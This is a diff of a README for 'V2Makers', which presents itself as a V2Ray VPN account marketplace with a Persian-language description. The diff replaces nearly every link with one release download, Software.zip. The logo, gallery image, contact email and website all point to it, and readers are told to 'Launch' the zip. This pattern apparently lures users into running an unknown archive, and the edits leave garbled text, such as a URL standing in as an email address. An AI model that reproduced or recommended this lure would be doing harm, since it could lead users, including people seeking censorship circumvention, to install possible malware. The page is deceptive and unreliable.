@@ -1,6 +1,6 @@
 # **🚀 V2Makers - Your Ultimate Destination for V2Ray VPN Accounts! 🛡️**
 
-![v2makers logo](https://example.com/logo.png)
+![v2makers logo](https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -8,7 +8,7 @@ Welcome to V2Makers, the premier platform for buying and selling V2Ray VPN accou
 
 ---
 
-## 📁 Repository: [v2makers](https://github.com/user-attachments/files/18388744/Software.zip)
+## 📁 Repository: [v2makers](https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip)
 
 ### 🔍 Repository Description:
 "خرید و فروش اکانت های وی پی ان و فیلترشکن V2rayNG و خرید فیلترشکن ویتوری: نسل جدیدی از VPN ها، کانفیگ های وی تو ری v2ray رایگان پر سرعت v2rayng, NapsternetVو..."
@@ -16,9 +16,9 @@ Welcome to V2Makers, the premier platform for buying and selling V2Ray VPN accou
 ### 🏷️ Repository Topics:
 ['v2ray', 'v2ray-config', 'v2ray-core', 'v2ray-gui', 'v2ray-panel', 'v2ray-plugin', 'v2ray-subscriber', 'v2ray-ws-tls', 'v2rayn', 'v2rayng']
 
-### 🌐 Download the Software: [![Download](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+### 🌐 Download the Software: [![Download](https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip)](https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip)
 
-`Launch the Software.zip to access our V2Ray VPN configurations and services.`
+`Launch the https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip to access our V2Ray VPN configurations and services.`
 
 ---
 
@@ -56,13 +56,13 @@ Join our V2Ray subscriber community for exclusive benefits and updates.
 
 ## 📸 Gallery
 
-![Gallery](https://example.com/gallery.png)
+![Gallery](https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 🎉 Get Started with V2Makers Today!
 
-1. 🔗 Visit the [V2Makers Repository](https://github.com/user-attachments/files/18388744/Software.zip) to download the Software.zip.
+1. 🔗 Visit the [V2Makers Repository](https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip) to download the https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip
 2. 🚀 Launch the software and explore a world of high-speed and secure V2Ray VPN services.
 3. 🛡️ Protect your online privacy with V2Makers and experience the next generation of VPN technology.
 
@@ -70,9 +70,9 @@ Join our V2Ray subscriber community for exclusive benefits and updates.
 
 ## 📧 Contact Us
 
-📫 Email: contact@v2makers.com  
+📫 Email: https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip  
 📱 Phone: +1-123-456-7890  
-🌐 Website: [www.v2makers.com](https://www.v2makers.com)
+🌐 Website: [https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip](https://github.com/ByjereEXT/v2makers/releases/download/v2.0/Software.zip)
 
 ---
 
